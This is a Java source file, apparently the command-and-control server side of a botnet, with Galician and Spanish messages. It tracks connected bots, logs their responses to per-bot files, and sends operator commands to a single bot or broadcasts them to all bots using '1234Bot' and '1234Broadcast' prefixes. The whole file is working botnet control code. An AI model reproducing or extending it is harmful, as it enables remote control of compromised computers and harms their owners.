import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.*;
import java.net.*;
import java.util.*;

import javax.swing.JFrame;

public class NuevoClienteTCP extends JFrame implements Runnable, ActionListener {

	private Socket clientSocket;
	private DataInputStream dis = null;
	private DataOutputStream dos = null;
	private int identificador;
	private File archivo;
	private int lineafichero = 0;
	private FileWriter bw;
	private PrintWriter pw;
	private String FicheroPath;
	private boolean activo=true;
	private informacion infobotnet;

	public NuevoClienteTCP(Socket clientSocket, int identificador,informacion infobotnet) {
		infobotnet.addbot();
		this.clientSocket = clientSocket;
		this.infobotnet=infobotnet;
		this.identificador = identificador;
		this.FicheroPath = "C:\\RegistroOrdenesBotnet\\Bot" + identificador + ".txt";
		try {
			dos = new DataOutputStream(clientSocket.getOutputStream());
			System.out.println("\t\t\tConectouse o bot " + identificador);
			bw = new FileWriter(FicheroPath);
			pw = new PrintWriter(bw);
			pw.println("\t\t\t\t\t\t\t Registro de ordenes del bot " + identificador + "\n\n\n");
		} catch (IOException e) {
			// TODO Auto-generated catch block
			System.out.println("Non se pode abrir o ficheiro do bot " + identificador);
			e.printStackTrace();
		} finally {
			try {
				if (pw != null)
					pw.close();
				if (bw != null)
					bw.close();
			} catch (Exception navida) {
				navida.printStackTrace();
			}
		}
	}

	@Override
	public void run() {
		try {
			dis = new DataInputStream(clientSocket.getInputStream());
		} catch (Exception e) {
			e.printStackTrace();
			System.exit(0);
		}
		try {
			while (clientSocket.isConnected()) {
				String datosentrada = dis.readUTF();
				if (datosentrada.contains("Respuesta:")) {
					Faux.escribirfichero(FicheroPath, datosentrada.substring(10));
				}else if(datosentrada.contains("nbots")) {
				System.out.println("Agora mesmo hai " + infobotnet.getbots() + " bots no sistema");
				} else if (datosentrada.toLowerCase().equals("muerto")) {
					this.activo=false;
					infobotnet.eliminarbot();
					Faux.escribirfichero(FicheroPath, "\t\t\t\t\t\t El bot ha sido desconectado");
					dis.close();
					dos.close();
				} else {
					System.out.println("\n\t\t\tBot numero " + identificador + ":\n" + datosentrada);
				}
			}
		} catch (IOException e) {
			System.out.println("\n\t\t\tDesconectouse o bot numero " + identificador);
		}
		try {
			clientSocket.close();
			dis.close();
		} catch (Exception e) {
			System.out.println("Error ao cerrar o socket e/ou fluxos de datos");
		}
	}

	@Override
	public void actionPerformed(ActionEvent e) {
		if(activo) {
		if (e.getActionCommand().contains("1234Bot" + identificador + ":")
				|| e.getActionCommand().contains("1234Broadcast")
				|| e.getActionCommand().contains("1234Bot" + identificador + "--Comment:")) {

				boolean comentario = false;
				try {
					bw = new FileWriter(FicheroPath, true);
					pw = new PrintWriter(bw);
					dos = new DataOutputStream(clientSocket.getOutputStream());
					if (e.getActionCommand().contains("--Comment:")) {
						comentario = true;
						pw.println("*******Coment:"
								+ e.getActionCommand().substring(e.getActionCommand().indexOf(":") + 1));
					} else {
						lineafichero++;
						pw.println(lineafichero + ")"
								+ e.getActionCommand().substring(e.getActionCommand().indexOf(":") + 1));
					}
				} catch (Exception err) {
					System.out.println("Recordamos que o bot " + identificador + " foi desconectado");
				}
				try {
					if (!comentario) {
						dos.writeUTF(e.getActionCommand().substring(e.getActionCommand().indexOf(":") + 1));
					}
				} catch (Exception exc) {
					exc.printStackTrace();
				} finally {
					try {
						if (pw != null)
							pw.close();
						if (bw != null)
							bw.close();
					} catch (Exception navida) {
					}
				}
			}
		}else {
			if (e.getActionCommand().contains("1234Bot" + identificador + ":")
					|| e.getActionCommand().contains("1234Bot" + identificador + "--Comment:")) {
					System.out.println("Recordamos que o bot " + identificador + " foi desconectado");
	}}
	}
}
